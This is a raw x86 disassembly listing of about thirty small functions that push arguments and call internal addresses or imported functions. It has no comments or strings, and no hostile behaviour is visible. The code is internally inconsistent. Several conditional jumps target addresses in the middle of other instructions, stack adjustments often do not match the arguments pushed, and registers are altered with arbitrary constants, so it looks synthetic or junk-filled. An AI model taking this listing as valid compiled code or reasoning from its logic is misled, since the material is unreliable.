  4d10be:	call   0x4d0e00
  4d10c3:	add    esp,0x10
  4d10c6:	pop    ecx
  4d10c7:	push   ecx
  4d10c8:	push   0xfffffff4
  4d10ca:	call   0x4d0ee4
  4d10cf:	add    esp,0x4
  4d10d2:	pop    ecx
  4d10d3:	push   ecx
  4d10d4:	call   0x4d07b4
  4d10d9:	add    esp,0x4
  4d10dc:	pop    ecx
  4d10dd:	add    esp,0x34
  4d10e0:	pop    ebp
  4d10e1:	ret    
  4d10e2:	add    BYTE PTR [eax],al
  4d10e4:	mov    edi,edi
  4d10e6:	push   ebp
  4d10e7:	mov    ebp,esp
  4d10e9:	sub    esp,0x4c
  4d10ec:	lea    ebx,[ecx+0x14c]
  4d10f2:	or     edi,0xffffc0ad
  4d10f8:	push   ebx
  4d10f9:	push   edx
  4d10fa:	push   edi
  4d10fb:	push   DWORD PTR [ebx+0x144]
  4d1101:	call   0x4d0b08
  4d1106:	add    esp,0xc
  4d1109:	pop    ebx
  4d110a:	lea    edx,[ebx-0x1a4]
  4d1110:	push   edx
  4d1111:	call   0x4d0be4
  4d1116:	add    esp,0x4
  4d1119:	test   eax,eax
  4d111b:	jne    0x4d110b
  4d111d:	mov    esi,0x0
  4d1122:	push   esi
  4d1123:	call   0x4d0bf0
  4d1128:	add    esp,0x4
  4d112b:	add    esp,0x4c
  4d112e:	pop    ebp
  4d112f:	ret    
  4d1130:	pop    edi
  4d1131:	call   DWORD PTR ds:0x4d2060
  4d1137:	call   edi
  4d1139:	add    BYTE PTR [eax],al
  4d113b:	add    BYTE PTR [edi-0x1],bl
  4d113e:	adc    eax,0x4d2030
  4d1143:	call   edi
  4d1145:	add    BYTE PTR [eax],al
  4d1147:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d114d:	sub    esp,0x34
  4d1150:	mov    edx,0x4d3054
  4d1155:	add    DWORD PTR [ebp-0x14],esi
  4d1158:	push   edx
  4d1159:	push   DWORD PTR [edx+0x138]
  4d115f:	push   DWORD PTR [edx+0x50]
  4d1162:	push   edi
  4d1163:	call   0x4d1564
  4d1168:	add    esp,0xc
  4d116b:	pop    edx
  4d116c:	push   edx
  4d116d:	push   0xfffffff4
  4d116f:	call   0x4d0ee4
  4d1174:	add    esp,0x4
  4d1177:	pop    edx
  4d1178:	push   edx
  4d1179:	mov    eax,0x0
  4d117e:	push   eax
  4d117f:	call   0x4d0da4
  4d1184:	add    esp,0x4
  4d1187:	pop    edx
  4d1188:	add    esp,0x34
  4d118b:	pop    ebp
  4d118c:	ret    
  4d118d:	add    BYTE PTR [eax],al
  4d118f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1195:	sub    esp,0x2c
  4d1198:	lea    ebx,ds:0x4d3060
  4d119e:	sub    edx,esi
  4d11a0:	push   0xfffffff4
  4d11a2:	call   0x4d0ee4
  4d11a7:	add    esp,0x4
  4d11aa:	push   ebx
  4d11ab:	push   DWORD PTR [ebx+0x128]
  4d11b1:	push   edx
  4d11b2:	call   0x4d1324
  4d11b7:	add    esp,0x8
  4d11ba:	pop    ebx
  4d11bb:	mov    ecx,0x0
  4d11c0:	push   ecx
  4d11c1:	call   0x4d0bf0
  4d11c6:	add    esp,0x4
  4d11c9:	add    esp,0x2c
  4d11cc:	pop    ebp
  4d11cd:	ret    
  4d11ce:	add    BYTE PTR [eax],al
  4d11d0:	mov    edi,edi
  4d11d2:	push   ebp
  4d11d3:	mov    ebp,esp
  4d11d5:	sub    esp,0x24
  4d11d8:	lea    edi,ds:0x4d3080
  4d11de:	or     DWORD PTR [ebp-0x24],esi
  4d11e1:	push   edi
  4d11e2:	push   0x0
  4d11e4:	call   0x4d0bf0
  4d11e9:	add    esp,0x4
  4d11ec:	pop    edi
  4d11ed:	push   edi
  4d11ee:	push   DWORD PTR [edi+0xe4]
  4d11f4:	push   DWORD PTR [edi+0x54]
  4d11f7:	push   DWORD PTR [edi+0xd0]
  4d11fd:	call   0x4d137c
  4d1202:	add    esp,0xc
  4d1205:	pop    edi
  4d1206:	push   edi
  4d1207:	push   0x0
  4d1209:	call   0x4d079c
  4d120e:	add    esp,0x4
  4d1211:	pop    edi
  4d1212:	add    esp,0x24
  4d1215:	pop    ebp
  4d1216:	ret    
  4d1217:	add    BYTE PTR [edi-0x1],bl
  4d121a:	adc    eax,0x4d2094
  4d121f:	call   edi
  4d1221:	add    BYTE PTR [eax],al
  4d1223:	add    BYTE PTR [edi-0x1],bl
  4d1226:	adc    eax,0x4d204c
  4d122b:	call   edi
  4d122d:	add    BYTE PTR [eax],al
  4d122f:	add    BYTE PTR [edi-0x1],bl
  4d1232:	adc    eax,0x4d2064
  4d1237:	call   edi
  4d1239:	add    BYTE PTR [eax],al
  4d123b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1241:	sub    esp,0x20
  4d1244:	lea    eax,ds:0x4d305c
  4d124a:	mov    esi,edx
  4d124c:	push   eax
  4d124d:	push   0x0
  4d124f:	call   0x4d0bf0
  4d1254:	add    esp,0x4
  4d1257:	pop    eax
  4d1258:	push   eax
  4d1259:	push   edi
  4d125a:	push   edx
  4d125b:	call   0x4d0ba4
  4d1260:	add    esp,0x8
  4d1263:	pop    eax
  4d1264:	push   eax
  4d1265:	mov    edi,0x0
  4d126a:	push   edi
  4d126b:	call   0x4d1028
  4d1270:	add    esp,0x4
  4d1273:	pop    eax
  4d1274:	add    esp,0x20
  4d1277:	pop    ebp
  4d1278:	ret    
  4d1279:	add    BYTE PTR [eax],al
  4d127b:	add    BYTE PTR [edi-0x1],bl
  4d127e:	adc    eax,0x4d2080
  4d1283:	call   edi
  4d1285:	add    BYTE PTR [eax],al
  4d1287:	add    BYTE PTR [edi-0x1],bl
  4d128a:	adc    eax,0x4d2028
  4d128f:	call   edi
  4d1291:	add    BYTE PTR [eax],al
  4d1293:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1299:	sub    esp,0x44
  4d129c:	lea    ecx,ds:0x4d30d8
  4d12a2:	or     edi,0xffffef44
  4d12a8:	push   ecx
  4d12a9:	push   DWORD PTR [ecx+0x80]
  4d12af:	push   DWORD PTR [ecx+0xd8]
  4d12b5:	push   edi
  4d12b6:	push   edx
  4d12b7:	call   0x4d0cf4
  4d12bc:	add    esp,0x10
  4d12bf:	pop    ecx
  4d12c0:	push   ecx
  4d12c1:	push   0x0
  4d12c3:	call   0x4d079c
  4d12c8:	add    esp,0x4
  4d12cb:	pop    ecx
  4d12cc:	push   ecx
  4d12cd:	push   0x0
  4d12cf:	call   0x4d0da4
  4d12d4:	add    esp,0x4
  4d12d7:	pop    ecx
  4d12d8:	add    esp,0x44
  4d12db:	pop    ebp
  4d12dc:	ret    
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12e5:	sub    esp,0x40
  4d12e8:	mov    eax,0x4d311c
  4d12ed:	sub    DWORD PTR [ebp-0x2c],esi
  4d12f0:	push   eax
  4d12f1:	push   ebx
  4d12f2:	push   esi
  4d12f3:	push   DWORD PTR [eax+0x18c]
  4d12f9:	call   0x4d1294
  4d12fe:	add    esp,0xc
  4d1301:	pop    eax
  4d1302:	push   eax
  4d1303:	push   0x0
  4d1305:	call   0x4d0da4
  4d130a:	add    esp,0x4
  4d130d:	pop    eax
  4d130e:	push   eax
  4d130f:	mov    edi,0x0
  4d1314:	push   edi
  4d1315:	call   0x4d0bf0
  4d131a:	add    esp,0x4
  4d131d:	pop    eax
  4d131e:	add    esp,0x40
  4d1321:	pop    ebp
  4d1322:	ret    
  4d1323:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1329:	sub    esp,0x30
  4d132c:	mov    edi,0x4d3098
  4d1331:	add    DWORD PTR [ebp-0x18],esi
  4d1334:	push   edi
  4d1335:	call   0x4d07b4
  4d133a:	add    esp,0x4
  4d133d:	pop    edi
  4d133e:	push   edi
  4d133f:	push   DWORD PTR [edi+0x190]
  4d1345:	push   DWORD PTR [edi+0x1b8]
  4d134b:	push   eax
  4d134c:	call   0x4d1454
  4d1351:	add    esp,0xc
  4d1354:	pop    edi
  4d1355:	push   edi
  4d1356:	call   0x4d07b4
  4d135b:	add    esp,0x4
  4d135e:	pop    edi
  4d135f:	add    esp,0x30
  4d1362:	pop    ebp
  4d1363:	ret    
  4d1364:	pop    edi
  4d1365:	call   DWORD PTR ds:0x4d2038
  4d136b:	call   edi
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d2098
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x5c
  4d1384:	lea    ecx,[edi+0x120]
  4d138a:	mov    DWORD PTR [ecx-0x8c],0xfffffc1e
  4d1394:	push   ecx
  4d1395:	push   eax
  4d1396:	push   DWORD PTR [ecx+0x118]
  4d139c:	push   DWORD PTR [ecx+0x3c]
  4d139f:	push   esi
  4d13a0:	call   0x4d123c
  4d13a5:	add    esp,0x10
  4d13a8:	pop    ecx
  4d13a9:	push   ecx
  4d13aa:	push   0x0
  4d13ac:	call   0x4d0ae4
  4d13b1:	add    esp,0x4
  4d13b4:	pop    ecx
  4d13b5:	push   ecx
  4d13b6:	call   0x4d1288
  4d13bb:	add    esp,0x4
  4d13be:	pop    ecx
  4d13bf:	add    esp,0x5c
  4d13c2:	pop    ebp
  4d13c3:	ret    
  4d13c4:	mov    edi,edi
  4d13c6:	push   ebp
  4d13c7:	mov    ebp,esp
  4d13c9:	sub    esp,0x58
  4d13cc:	mov    edx,0x4d30bc
  4d13d1:	mov    eax,0x7058
  4d13d6:	push   edx
  4d13d7:	push   DWORD PTR [edx+0x20]
  4d13da:	push   DWORD PTR [edx+0x1b4]
  4d13e0:	push   DWORD PTR [edx+0x194]
  4d13e6:	call   0x4d07e4
  4d13eb:	add    esp,0xc
  4d13ee:	pop    edx
  4d13ef:	push   edx
  4d13f0:	mov    edi,0x0
  4d13f5:	push   edi
  4d13f6:	call   0x4d0da4
  4d13fb:	add    esp,0x4
  4d13fe:	pop    edx
  4d13ff:	push   edx
  4d1400:	mov    ecx,0x0
  4d1405:	push   ecx
  4d1406:	call   0x4d1010
  4d140b:	add    esp,0x4
  4d140e:	pop    edx
  4d140f:	add    esp,0x58
  4d1412:	pop    ebp
  4d1413:	ret    
  4d1414:	mov    edi,edi
  4d1416:	push   ebp
  4d1417:	mov    ebp,esp
  4d1419:	sub    esp,0x4c
  4d141c:	lea    esi,ds:0x4d30e8
  4d1422:	sub    DWORD PTR [esi+0xd4],esi
  4d1428:	mov    ecx,0x0
  4d142d:	push   ecx
  4d142e:	call   0x4d079c
  4d1433:	add    esp,0x4
  4d1436:	push   esi
  4d1437:	push   edx
  4d1438:	push   ebx
  4d1439:	call   0x4d0f38
  4d143e:	add    esp,0x8
  4d1441:	pop    esi
  4d1442:	push   0x0
  4d1444:	call   0x4d1034
  4d1449:	add    esp,0x4
  4d144c:	add    esp,0x4c
  4d144f:	pop    ebp
  4d1450:	ret    
  4d1451:	add    BYTE PTR [eax],al
  4d1453:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1459:	sub    esp,0x50
  4d145c:	lea    edx,[edi+0xc4]
  4d1462:	and    DWORD PTR [ebp-0x2c],0x4f
  4d1466:	push   edx
  4d1467:	mov    ecx,0x0
  4d146c:	push   ecx
  4d146d:	call   0x4d079c
  4d1472:	add    esp,0x4
  4d1475:	pop    edx
  4d1476:	push   edx
  4d1477:	push   DWORD PTR [edx+0xf8]
  4d147d:	push   esi
  4d147e:	push   eax
  4d147f:	push   DWORD PTR [edx+0x20]
  4d1482:	call   0x4d0e4c
  4d1487:	add    esp,0x10
  4d148a:	pop    edx
  4d148b:	push   edx
  4d148c:	call   0x4d07b4
  4d1491:	add    esp,0x4
  4d1494:	pop    edx
  4d1495:	add    esp,0x50
  4d1498:	pop    ebp
  4d1499:	ret    
  4d149a:	add    BYTE PTR [eax],al
  4d149c:	mov    edi,edi
  4d149e:	push   ebp
  4d149f:	mov    ebp,esp
  4d14a1:	sub    esp,0x28
  4d14a4:	lea    ebx,[eax-0xbc]
  4d14aa:	sbb    esi,eax
  4d14ac:	push   0x0
  4d14ae:	call   0x4d1088
  4d14b3:	add    esp,0x4
  4d14b6:	push   ebx
  4d14b7:	push   DWORD PTR [ebx+0x34]
  4d14ba:	push   eax
  4d14bb:	call   0x4d0a8c
  4d14c0:	add    esp,0x8
  4d14c3:	pop    ebx
  4d14c4:	call   0x4d1288
  4d14c9:	add    esp,0x4
  4d14cc:	add    esp,0x28
  4d14cf:	pop    ebp
  4d14d0:	ret    
  4d14d1:	add    BYTE PTR [eax],al
  4d14d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d9:	sub    esp,0x4c
  4d14dc:	mov    esi,0x4d300c
  4d14e1:	sbb    edi,DWORD PTR [esi+0x174]
  4d14e7:	push   esi
  4d14e8:	push   edx
  4d14e9:	push   DWORD PTR [esi+0x1c]
  4d14ec:	push   DWORD PTR [esi+0x128]
  4d14f2:	push   DWORD PTR [esi+0x1a4]
  4d14f8:	call   0x4d090c
  4d14fd:	add    esp,0x10
  4d1500:	pop    esi
  4d1501:	lea    edi,[esi-0xc]
  4d1504:	push   edi
  4d1505:	call   0x4d0be4
  4d150a:	add    esp,0x4
  4d150d:	test   eax,eax
  4d150f:	jne    0x4d1502
  4d1511:	lea    edi,[esi-0xc]
  4d1514:	push   edi
  4d1515:	call   0x4d0be4
  4d151a:	add    esp,0x4
  4d151d:	test   eax,eax
  4d151f:	jne    0x4d1512
  4d1521:	add    esp,0x4c
  4d1524:	pop    ebp
  4d1525:	ret    
  4d1526:	add    BYTE PTR [eax],al
  4d1528:	mov    edi,edi
  4d152a:	push   ebp
  4d152b:	mov    ebp,esp
  4d152d:	sub    esp,0x40
  4d1530:	lea    esi,[ebx-0xdc]
  4d1536:	or     edi,edx
  4d1538:	push   esi
  4d1539:	push   DWORD PTR [esi+0xf0]
  4d153f:	push   DWORD PTR [esi+0x160]
  4d1545:	call   0x4d11d0
  4d154a:	add    esp,0x8
  4d154d:	pop    esi
  4d154e:	call   0x4d1288
  4d1553:	add    esp,0x4
  4d1556:	call   0x4d0d98
  4d155b:	add    esp,0x4
  4d155e:	add    esp,0x40
  4d1561:	pop    ebp
  4d1562:	ret    
  4d1563:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1569:	sub    esp,0x30
  4d156c:	lea    edi,ds:0x4d3040
  4d1572:	adc    DWORD PTR [edi+0x19c],edi
  4d1578:	push   edi
  4d1579:	push   0x0
  4d157b:	call   0x4d1028
  4d1580:	add    esp,0x4
  4d1583:	pop    edi
  4d1584:	push   edi
  4d1585:	push   DWORD PTR [edi+0x24]
  4d1588:	push   DWORD PTR [edi+0xc8]
  4d158e:	call   0x4d0888
  4d1593:	add    esp,0x8
  4d1596:	pop    edi
  4d1597:	push   edi
  4d1598:	push   0x0
  4d159a:	call   0x4d1010
  4d159f:	add    esp,0x4
  4d15a2:	pop    edi
  4d15a3:	add    esp,0x30
  4d15a6:	pop    ebp
  4d15a7:	ret    
  4d15a8:	mov    edi,edi
  4d15aa:	push   ebp
  4d15ab:	mov    ebp,esp
  4d15ad:	sub    esp,0x44
  4d15b0:	lea    esi,[edi+0x4c]
  4d15b3:	adc    DWORD PTR [ebp-0x14],esi
  4d15b6:	push   esi
  4d15b7:	push   DWORD PTR [esi+0x148]
  4d15bd:	push   DWORD PTR [esi+0x1d4]
  4d15c3:	push   edx
  4d15c4:	call   0x4d1040
  4d15c9:	add    esp,0xc
  4d15cc:	pop    esi
  4d15cd:	mov    ecx,0x0
  4d15d2:	push   ecx
  4d15d3:	call   0x4d1010
  4d15d8:	add    esp,0x4
  4d15db:	push   0x0
  4d15dd:	call   0x4d1088
  4d15e2:	add    esp,0x4
  4d15e5:	add    esp,0x44
  4d15e8:	pop    ebp
  4d15e9:	ret    
	...
